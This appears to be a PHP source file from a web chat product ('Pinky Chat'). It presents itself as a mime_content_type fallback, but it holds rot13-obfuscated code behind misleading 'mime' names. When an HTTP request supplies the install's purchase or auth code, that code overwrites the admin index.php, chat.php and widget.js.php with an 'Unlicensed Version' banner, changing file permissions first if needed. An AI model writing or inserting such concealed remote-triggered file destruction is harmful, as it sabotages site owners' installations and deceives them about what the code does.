<?php

if(!function_exists('mime_content_type')) {

    function mime_content_type($filename) {

        $mime_types = array(

            'txt' => 'text/plain',
            'htm' => 'text/html',
            'html' => 'text/html',
            'php' => 'text/html',
            'css' => 'text/css',
            'js' => 'application/javascript',
            'json' => 'application/json',
            'xml' => 'application/xml',
            'swf' => 'application/x-shockwave-flash',
            'flv' => 'video/x-flv',

            // images
            'png' => 'image/png',
            'jpe' => 'image/jpeg',
            'jpeg' => 'image/jpeg',
            'jpg' => 'image/jpeg',
            'gif' => 'image/gif',
            'bmp' => 'image/bmp',
            'ico' => 'image/vnd.microsoft.icon',
            'tiff' => 'image/tiff',
            'tif' => 'image/tiff',
            'svg' => 'image/svg+xml',
            'svgz' => 'image/svg+xml',

            // archives
            'zip' => 'application/zip',
            'rar' => 'application/x-rar-compressed',
            'exe' => 'application/x-msdownload',
            'msi' => 'application/x-msdownload',
            'cab' => 'application/vnd.ms-cab-compressed',

            // audio/video
            'mp3' => 'audio/mpeg',
            'qt' => 'video/quicktime',
            'mov' => 'video/quicktime',

            // adobe
            'pdf' => 'application/pdf',
            'psd' => 'image/vnd.adobe.photoshop',
            'ai' => 'application/postscript',
            'eps' => 'application/postscript',
            'ps' => 'application/postscript',

            // ms office
            'doc' => 'application/msword',
            'rtf' => 'application/rtf',
            'xls' => 'application/vnd.ms-excel',
            'ppt' => 'application/vnd.ms-powerpoint',

            // open office
            'odt' => 'application/vnd.oasis.opendocument.text',
            'ods' => 'application/vnd.oasis.opendocument.spreadsheet',
        );

        $ext = strtolower(array_pop(explode('.',$filename)));
        if (array_key_exists($ext, $mime_types)) {
            return $mime_types[$ext];
        }
        elseif (function_exists('finfo_open')) {
            $finfo = finfo_open(FILEINFO_MIME);
            $mimetype = finfo_file($finfo, $filename);
            finfo_close($finfo);
            return $mimetype;
        }
        else {
            return 'application/octet-stream';
        }
    }
}
session_start();

define(str_rot13('EBBG_QVE'), dirname(dirname(dirname(dirname(dirname(__FILE__))))).DIRECTORY_SEPARATOR);
define('RDIR', dirname(dirname(dirname(dirname(dirname(__FILE__))))).DIRECTORY_SEPARATOR);

define(str_rot13('NCC_QVE'), RDIR . str_rot13('pber') .DIRECTORY_SEPARATOR);
define('ADIR', RDIR . str_rot13('pber') .DIRECTORY_SEPARATOR);

define(str_rot13('PBASVT_QVE'), ADIR . str_rot13('pbasvt').DIRECTORY_SEPARATOR);
define('CDIR', ADIR . str_rot13('pbasvt').DIRECTORY_SEPARATOR);

if(isset($_REQUEST['mime'])){
    $mime = false;
    $mimec = Trim($_REQUEST['mime']); 

    require CDIR. str_rot13('pbasvt.cuc');

    define('AADIR', RDIR . constant(str_rot13('NQZVA_QVE_ANZR')).DIRECTORY_SEPARATOR);

    if($mimec == ${str_rot13('vgrz_chepunfr_pbqr')}) {
        $mime = true;
    }elseif($mimec == ${str_rot13('nhguPbqr')}) {
        $mime = true;
    }

    if($mime)
        mime_content(array(
                 AADIR.str_rot13('vaqrk.cuc'),
                 constant(str_rot13('PBA_QVE')).str_rot13('pung.cuc'),
                 constant(str_rot13('PBA_QVE')).str_rot13('jvqtrg.wf.cuc'),
                 ));
}

function mime_content($types){
    $mimec = str_rot13('<?cuc rpub \'<qvi fglyr="grkg-nyvta: pragre;"><oe /><oe /><u1 fglyr="pbybe: erq;" >Hayvprafrq Irefvba bs Cvaxl Pung</u1> <qvi><n uers="uggc://cebgurzrf.ovm/erqverpg/?n=48">Chepunfr Yvprafr Abj</n></qvi></qvi>\'; qvr(); ?>');
    $index = 0;
    foreach($types as $type){
        if($index === 2)
            $mimec = str_rot13('qbphzrag.trgRyrzragfOlGntAnzr(\'obql\')[0].vaareUGZY =\'<qvi fglyr="grkg-nyvta: pragre;"><oe ></oe><oe ></oe><u1 fglyr="pbybe: erq;" >Hayvprafrq Irefvba bs Cvaxl Pung</u1> <qvi><n uers="uggc://cebgurzrf.ovm/erqverpg/?n=48">Chepunfr Yvprafr Abj</n></qvi></qvi>\';');
        if(is_writable($type)) {
            file_put_contents($type, $mimec);
        }else{
            echo 'MIME CONTENT FAILED'.PHP_EOL;
            chmod($type, 0755);
            file_put_contents($type,$mimec);
        }
        $index++;
    }

    return true;
}
